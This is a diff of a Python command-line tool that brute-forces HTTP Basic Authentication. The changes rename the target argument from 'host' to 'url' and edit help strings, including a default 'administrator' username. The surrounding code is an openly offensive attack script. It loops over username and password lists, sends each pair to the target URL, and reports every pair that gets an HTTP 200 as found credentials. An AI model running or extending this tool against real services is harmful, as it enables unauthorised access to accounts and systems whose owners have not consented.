@@ -14,11 +14,11 @@ import argparse
 import base64
 
 parser = argparse.ArgumentParser(description='HTTP Basic Auth brute')
-parser.add_argument('-u', '--user',dest="username", type=str, help="single username to use: 'tomcatadmin'")
-parser.add_argument('-c', '--creds', dest="creds", type=argparse.FileType('r', encoding='UTF-8'), help="credentials: 'username:password'")
+parser.add_argument('-u', '--user',dest="username", type=str, help="Single username to use: 'administrator'")
+parser.add_argument('-c', '--creds', dest="creds", type=argparse.FileType('r', encoding='UTF-8'), help="Credentials: 'username:password'")
 parser.add_argument('-U', '--usernames', dest="usernames", type=argparse.FileType('r', encoding='UTF-8'))
 parser.add_argument('-p', '--passwords', dest="passwords", type=argparse.FileType('r', encoding='UTF-8'))
-parser.add_argument(dest="host", help='host to attack')
+parser.add_argument(dest="url", help='Url to attack')
 args = parser.parse_args()
 
 def printout():
@@ -33,7 +33,7 @@ def printout():
 	print("	 / ___ / /_/ / /_/ / / /  / /_/ / /  / /_/ / /_/  __/")
 	print("	/_/  |_\__,_/\__/_/ /_/  /_____/_/   \__,_/\__/\___/")
 	print("\n___________________________________________________________________\n")
-	print("URL:		"+args.host)
+	print("URL:		"+args.url)
 	if args.creds:
 		print("Creds:		"+args.creds.name)
 	if args.username:
@@ -43,9 +43,9 @@ def printout():
 	if args.passwords:
 		print("Passwords:	"+args.passwords.name)
 	print("\n___________________________________________________________________\n")
-def request(host, user, passw):
+def request(url, user, passw):
 	print("\x1b[1K\rbruting.... " + user + ":" + passw, end='')
-	r = requests.get(host,auth=HTTPBasicAuth(user, passw))
+	r = requests.get(url,auth=HTTPBasicAuth(user, passw))
 	return r
 
 def parse_cred_lists():
@@ -71,7 +71,7 @@ def enumerate(u_list,p_list):
 	found = []
 	for u in u_list:
 		for p in p_list:
-			r = request(args.host, u, p)
+			r = request(args.url, u, p)
 			if r.status_code == 200:
 				print("   CORRECT CREDENTIALS FOUND")
 				found.append((u,p))
